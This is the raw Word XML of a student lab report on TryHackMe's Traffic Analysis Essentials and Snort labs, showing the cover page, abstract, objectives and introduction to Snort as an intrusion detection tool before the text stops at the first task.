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1113413" w:displacedByCustomXml="next"/>
    <w:bookmarkEnd w:id="0" w:displacedByCustomXml="next"/>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:id w:val="545186340"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Cover Pages"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="4592F74C" w14:textId="4390B4C4" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00714B36">
          <w:pPr>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00714B36">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66A535DE" wp14:editId="722C38A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B5EE76" w14:textId="100E5A13" w:rsidR="00714B36" w:rsidRDefault="00B66C4E" w:rsidP="00714B36">
                                    <w:pPr>
                                      <w:pStyle w:val="NoSpacing"/>
                                      <w:jc w:val="right"/>
                                      <w:rPr>
                                        <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                        <w:sz w:val="28"/>
                                        <w:szCs w:val="28"/>
                                      </w:rPr>
                                    </w:pPr>
                                    <w:r>
                                      <w:rPr>
                                        <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                        <w:sz w:val="28"/>
                                        <w:szCs w:val="28"/>
                                      </w:rPr>
                                      <w:t>Jacob Graessle</w:t>
                                    </w:r>
                                  </w:p>
                                </w:sdtContent>
                              </w:sdt>
                              <w:p w14:paraId="68538225" w14:textId="17850952" w:rsidR="00714B36" w:rsidRDefault="00B66C4E" w:rsidP="00714B36">
                                <w:pPr>
                                  <w:pStyle w:val="NoSpacing"/>
                                  <w:jc w:val="right"/>
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="28"/>
                                    <w:szCs w:val="28"/>
                                  </w:rPr>
                                </w:pPr>
                                <w:r>
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="28"/>
                                    <w:szCs w:val="28"/>
                                  </w:rPr>
                                  <w:t>Incident Response Forensics</w:t>
                                </w:r>
                              </w:p>
                              <w:p w14:paraId="74C23B0C" w14:textId="0EA6DE51" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00B66C4E" w:rsidP="00714B36">
                                <w:pPr>
                                  <w:pStyle w:val="NoSpacing"/>
                                  <w:jc w:val="right"/>
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="28"/>
                                    <w:szCs w:val="28"/>
                                  </w:rPr>
                                </w:pPr>
                                <w:r>
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="28"/>
                                    <w:szCs w:val="28"/>
                                  </w:rPr>
                                  <w:t>Michael Zambotti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6A535DE" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                    <v:stroke joinstyle="miter"/>
                    <v:path gradientshapeok="t" o:connecttype="rect"/>
                  </v:shapetype>
                  <v:shape id="Text Box 159" o:spid="_x0000_s1026"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B5EE76" w14:textId="100E5A13" w:rsidR="00714B36" w:rsidRDefault="00B66C4E" w:rsidP="00714B36">
                              <w:pPr>
                                <w:pStyle w:val="NoSpacing"/>
                                <w:jc w:val="right"/>
                                <w:rPr>
                                  <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                  <w:sz w:val="28"/>
                                  <w:szCs w:val="28"/>
                                </w:rPr>
                              </w:pPr>
                              <w:r>
                                <w:rPr>
                                  <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                  <w:sz w:val="28"/>
                                  <w:szCs w:val="28"/>
                                </w:rPr>
                                <w:t>Jacob Graessle</w:t>
                              </w:r>
                            </w:p>
                          </w:sdtContent>
                        </w:sdt>
                        <w:p w14:paraId="68538225" w14:textId="17850952" w:rsidR="00714B36" w:rsidRDefault="00B66C4E" w:rsidP="00714B36">
                          <w:pPr>
                            <w:pStyle w:val="NoSpacing"/>
                            <w:jc w:val="right"/>
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="28"/>
                              <w:szCs w:val="28"/>
                            </w:rPr>
                          </w:pPr>
                          <w:r>
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="28"/>
                              <w:szCs w:val="28"/>
                            </w:rPr>
                            <w:t>Incident Response Forensics</w:t>
                          </w:r>
                        </w:p>
                        <w:p w14:paraId="74C23B0C" w14:textId="0EA6DE51" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00B66C4E" w:rsidP="00714B36">
                          <w:pPr>
                            <w:pStyle w:val="NoSpacing"/>
                            <w:jc w:val="right"/>
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="28"/>
                              <w:szCs w:val="28"/>
                            </w:rPr>
                          </w:pPr>
                          <w:r>
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="28"/>
                              <w:szCs w:val="28"/>
                            </w:rPr>
                            <w:t>Michael Zambotti</w:t>
                          </w:r>
                        </w:p>
                      </w:txbxContent>
                    </v:textbox>
                    <w10:wrap type="square" anchorx="page" anchory="page"/>
                  </v:shape>
                </w:pict>
              </mc:Fallback>
            </mc:AlternateContent>
          </w:r>
        </w:p>
        <w:p w14:paraId="2B4149E9" w14:textId="0C1DC9BB" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00000000" w:rsidP="00714B36">
          <w:pPr>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:pPr>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="2DE4E355" w14:textId="05B719F3" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00714B36">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C4DEAD7" w14:textId="0BB68B0C" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00714B36">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7984A776" w14:textId="5547609C" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00FA5159">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">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4276DEF1" wp14:editId="1EEFAEC1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>-161925</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="page">
                  <wp:posOffset>2665095</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="6066155" cy="1428750"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapSquare wrapText="bothSides"/>
                <wp:docPr id="154" name="Text Box 163"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="6066155" cy="1428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51E55" w14:textId="2E13AAC3" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00000000" w:rsidP="00FA5159">
                            <w:pPr>
                              <w:jc w:val="center"/>
                              <w:rPr>
                                <w:sz w:val="64"/>
                                <w:szCs w:val="64"/>
                              </w:rPr>
                            </w:pPr>
                            <w:sdt>
                              <w:sdtPr>
                                <w:rPr>
                                  <w:caps/>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15EBC">
                                  <w:rPr>
                                    <w:caps/>
                                    <w:sz w:val="64"/>
                                    <w:szCs w:val="64"/>
                                  </w:rPr>
                                  <w:t>Traffic analysis and snort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8B55" w14:textId="13C28E57" w:rsidR="00714B36" w:rsidRDefault="00B364BE" w:rsidP="00FA5159">
                                <w:pPr>
                                  <w:jc w:val="center"/>
                                  <w:rPr>
                                    <w:smallCaps/>
                                    <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                                    <w:sz w:val="36"/>
                                    <w:szCs w:val="36"/>
                                  </w:rPr>
                                </w:pPr>
                                <w:r>
                                  <w:rPr>
                                    <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                                    <w:sz w:val="36"/>
                                    <w:szCs w:val="36"/>
                                  </w:rPr>
                                  <w:t>2</w:t>
                                </w:r>
                                <w:r w:rsidR="00B66C4E">
                                  <w:rPr>
                                    <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                                    <w:sz w:val="36"/>
                                    <w:szCs w:val="36"/>
                                  </w:rPr>
                                  <w:t>/</w:t>
                                </w:r>
                                <w:r w:rsidR="00FA5159">
                                  <w:rPr>
                                    <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                                    <w:sz w:val="36"/>
                                    <w:szCs w:val="36"/>
                                  </w:rPr>
                                  <w:t>23</w:t>
                                </w:r>
                                <w:r w:rsidR="00B66C4E">
                                  <w:rPr>
                                    <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                                    <w:sz w:val="36"/>
                                    <w:szCs w:val="36"/>
                                  </w:rPr>
                                  <w:t>/2025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76DEF1" id="Text Box 163" o:spid="_x0000_s1027" type="#_x0000_t202" style="position:absolute;margin-left:-12.75pt;margin-top:209.85pt;width:477.65pt;height:112.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" filled="f" stroked="f" strokeweight=".5pt">
                <v:textbox inset="126pt,0,54pt,0">
                  <w:txbxContent>
                    <w:p w14:paraId="62851E55" w14:textId="2E13AAC3" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00000000" w:rsidP="00FA5159">
                      <w:pPr>
                        <w:jc w:val="center"/>
                        <w:rPr>
                          <w:sz w:val="64"/>
                          <w:szCs w:val="64"/>
                        </w:rPr>
                      </w:pPr>
                      <w:sdt>
                        <w:sdtPr>
                          <w:rPr>
                            <w:caps/>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15EBC">
                            <w:rPr>
                              <w:caps/>
                              <w:sz w:val="64"/>
                              <w:szCs w:val="64"/>
                            </w:rPr>
                            <w:t>Traffic analysis and snort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8B55" w14:textId="13C28E57" w:rsidR="00714B36" w:rsidRDefault="00B364BE" w:rsidP="00FA5159">
                          <w:pPr>
                            <w:jc w:val="center"/>
                            <w:rPr>
                              <w:smallCaps/>
                              <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                              <w:sz w:val="36"/>
                              <w:szCs w:val="36"/>
                            </w:rPr>
                          </w:pPr>
                          <w:r>
                            <w:rPr>
                              <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                              <w:sz w:val="36"/>
                              <w:szCs w:val="36"/>
                            </w:rPr>
                            <w:t>2</w:t>
                          </w:r>
                          <w:r w:rsidR="00B66C4E">
                            <w:rPr>
                              <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                              <w:sz w:val="36"/>
                              <w:szCs w:val="36"/>
                            </w:rPr>
                            <w:t>/</w:t>
                          </w:r>
                          <w:r w:rsidR="00FA5159">
                            <w:rPr>
                              <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                              <w:sz w:val="36"/>
                              <w:szCs w:val="36"/>
                            </w:rPr>
                            <w:t>23</w:t>
                          </w:r>
                          <w:r w:rsidR="00B66C4E">
                            <w:rPr>
                              <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
                              <w:sz w:val="36"/>
                              <w:szCs w:val="36"/>
                            </w:rPr>
                            <w:t>/2025</w:t>
                          </w:r>
                        </w:p>
                      </w:sdtContent>
                    </w:sdt>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" anchorx="margin" anchory="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00714B36">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361D412" wp14:editId="2F2C9BF0">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="page">
                  <wp:posOffset>4105275</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="7315200" cy="1009650"/>
                <wp:effectExtent l="0" t="0" r="0" b="1905"/>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A03F3" w14:textId="77777777" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00714B36" w:rsidP="00714B36">
                            <w:pPr>
                              <w:pStyle w:val="NoSpacing"/>
                              <w:jc w:val="center"/>
                              <w:rPr>
                                <w:sz w:val="28"/>
                                <w:szCs w:val="28"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00714B36">
                              <w:rPr>
                                <w:sz w:val="28"/>
                                <w:szCs w:val="28"/>
                              </w:rPr>
                              <w:t>Abstract</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="07C66E60" w14:textId="6E5B1D54" w:rsidR="00714B36" w:rsidRDefault="00000000" w:rsidP="00714B36">
                            <w:pPr>
                              <w:pStyle w:val="NoSpacing"/>
                              <w:jc w:val="center"/>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FA5159">
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="20"/>
                                    <w:szCs w:val="20"/>
                                  </w:rPr>
                                  <w:t xml:space="preserve">Lab Five consisted of </w:t>
                                </w:r>
                                <w:proofErr w:type="spellStart"/>
                                <w:r w:rsidR="00FA5159">
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="20"/>
                                    <w:szCs w:val="20"/>
                                  </w:rPr>
                                  <w:t>TryHackMe</w:t>
                                </w:r>
                                <w:proofErr w:type="spellEnd"/>
                                <w:r w:rsidR="00FA5159">
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="20"/>
                                    <w:szCs w:val="20"/>
                                  </w:rPr>
                                  <w:t xml:space="preserve"> labs: Traffic Analysis </w:t>
                                </w:r>
                                <w:r w:rsidR="00193561">
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="20"/>
                                    <w:szCs w:val="20"/>
                                  </w:rPr>
                                  <w:t>Essentials</w:t>
                                </w:r>
                                <w:r w:rsidR="00FA5159">
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="20"/>
                                    <w:szCs w:val="20"/>
                                  </w:rPr>
                                  <w:t>, Snort, Snort Challenge – The Basics, and Snort Challenge – Live Attacks. The report documents the objectives and main ideas of all labs</w:t>
                                </w:r>
                                <w:r w:rsidR="008463F1">
                                  <w:rPr>
                                    <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                    <w:sz w:val="20"/>
                                    <w:szCs w:val="20"/>
                                  </w:rPr>
                                  <w:t>.</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361D412" id="Text Box 161" o:spid="_x0000_s1028" type="#_x0000_t202" style="position:absolute;margin-left:0;margin-top:323.25pt;width:8in;height:79.5pt;z-index:251664384;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" filled="f" stroked="f" strokeweight=".5pt">
                <v:textbox style="mso-fit-shape-to-text:t" inset="126pt,0,54pt,0">
                  <w:txbxContent>
                    <w:p w14:paraId="568A03F3" w14:textId="77777777" w:rsidR="00714B36" w:rsidRPr="00714B36" w:rsidRDefault="00714B36" w:rsidP="00714B36">
                      <w:pPr>
                        <w:pStyle w:val="NoSpacing"/>
                        <w:jc w:val="center"/>
                        <w:rPr>
                          <w:sz w:val="28"/>
                          <w:szCs w:val="28"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00714B36">
                        <w:rPr>
                          <w:sz w:val="28"/>
                          <w:szCs w:val="28"/>
                        </w:rPr>
                        <w:t>Abstract</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="07C66E60" w14:textId="6E5B1D54" w:rsidR="00714B36" w:rsidRDefault="00000000" w:rsidP="00714B36">
                      <w:pPr>
                        <w:pStyle w:val="NoSpacing"/>
                        <w:jc w:val="center"/>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FA5159">
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="20"/>
                              <w:szCs w:val="20"/>
                            </w:rPr>
                            <w:t xml:space="preserve">Lab Five consisted of </w:t>
                          </w:r>
                          <w:proofErr w:type="spellStart"/>
                          <w:r w:rsidR="00FA5159">
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="20"/>
                              <w:szCs w:val="20"/>
                            </w:rPr>
                            <w:t>TryHackMe</w:t>
                          </w:r>
                          <w:proofErr w:type="spellEnd"/>
                          <w:r w:rsidR="00FA5159">
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="20"/>
                              <w:szCs w:val="20"/>
                            </w:rPr>
                            <w:t xml:space="preserve"> labs: Traffic Analysis </w:t>
                          </w:r>
                          <w:r w:rsidR="00193561">
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="20"/>
                              <w:szCs w:val="20"/>
                            </w:rPr>
                            <w:t>Essentials</w:t>
                          </w:r>
                          <w:r w:rsidR="00FA5159">
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="20"/>
                              <w:szCs w:val="20"/>
                            </w:rPr>
                            <w:t>, Snort, Snort Challenge – The Basics, and Snort Challenge – Live Attacks. The report documents the objectives and main ideas of all labs</w:t>
                          </w:r>
                          <w:r w:rsidR="008463F1">
                            <w:rPr>
                              <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                              <w:sz w:val="20"/>
                              <w:szCs w:val="20"/>
                            </w:rPr>
                            <w:t>.</w:t>
                          </w:r>
                        </w:sdtContent>
                      </w:sdt>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" anchorx="margin" anchory="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00714B36" w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C98444" w14:textId="2EE57208" w:rsidR="00127603" w:rsidRPr="00714B36" w:rsidRDefault="00714B36">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Report </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C95469" w14:textId="36B7FD23" w:rsidR="004D7F1C" w:rsidRPr="004D7F1C" w:rsidRDefault="00714B36" w:rsidP="004D7F1C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Objective of the Lab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711ED4C3" w14:textId="66162770" w:rsidR="00127603" w:rsidRPr="00714B36" w:rsidRDefault="00FA5159" w:rsidP="00FA6FE2">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The instructions for Lab Five were to complete Traffic Analysis Essentials, Snort, Snort Challenge</w:t>
      </w:r>
      <w:r w:rsidR="00DF508E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">—The Basics, and Snort Challenge—Live Attacks. The learning objectives for all labs were to gain a better understanding of how to analyze traffic </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>using Snort</w:t>
      </w:r>
      <w:r w:rsidR="00F25A92">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> The last two labs aimed to test the user’s knowledge by providing different scenario</w:t>
      </w:r>
      <w:r w:rsidR="00340C7C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s. These scenarios would force the user to create different rules and become familiar with the commands used by Snort.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D536AC" w14:textId="77777777" w:rsidR="00127603" w:rsidRDefault="00714B36">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF121A8" w14:textId="1EB1DA8F" w:rsidR="00274D5B" w:rsidRPr="00274D5B" w:rsidRDefault="00340C7C" w:rsidP="00FA6FE2">
      <w:r>
        <w:t xml:space="preserve">Traffic analysis is crucial for understanding what packets can be harmful to the user’s specific system. </w:t>
      </w:r>
      <w:r w:rsidR="00DF508E">
        <w:t>Different tools can</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> be used to capture packets for analysis. Snort is the tool used for this lab. It is used for packet analysis, but most importantly, intrusion detection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684F3782" w14:textId="26C7AC4E" w:rsidR="00127603" w:rsidRDefault="00714B36">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00714B36">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Process and Analysis</w:t>
      </w:r>
      <w:r w:rsidR="0051703F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620497B5" w14:textId="77777777" w:rsidR="00D14184" w:rsidRPr="00D14184" w:rsidRDefault="00D14184" w:rsidP="00D14184"/>
    <w:p w14:paraId="7834D763" w14:textId="1A756AB7" w:rsidR="00F014E7" w:rsidRDefault="00340C7C" w:rsidP="00512FED">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Traffic Analysis Essentials</w:t>
      </w:r>
      <w:r w:rsidR="00F014E7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48325B6C" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00512FED">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C8ABBA2" w14:textId="77777777" w:rsid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Task 1: Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F91BE91" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="714D40FE" w14:textId="357B276A"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Network security is meant for protecting data, applications, devices, and systems connected to a network. This section covers the foundations of Network Security, Traffic Analysis, and introduces essential concepts to help start Traffic/Packet Analysis. No answer is needed for this task.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC335F4" w14:textId="77777777" w:rsidR="00340C7C" w:rsidRPr="00340C7C" w:rsidRDefault="00340C7C" w:rsidP="00340C7C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
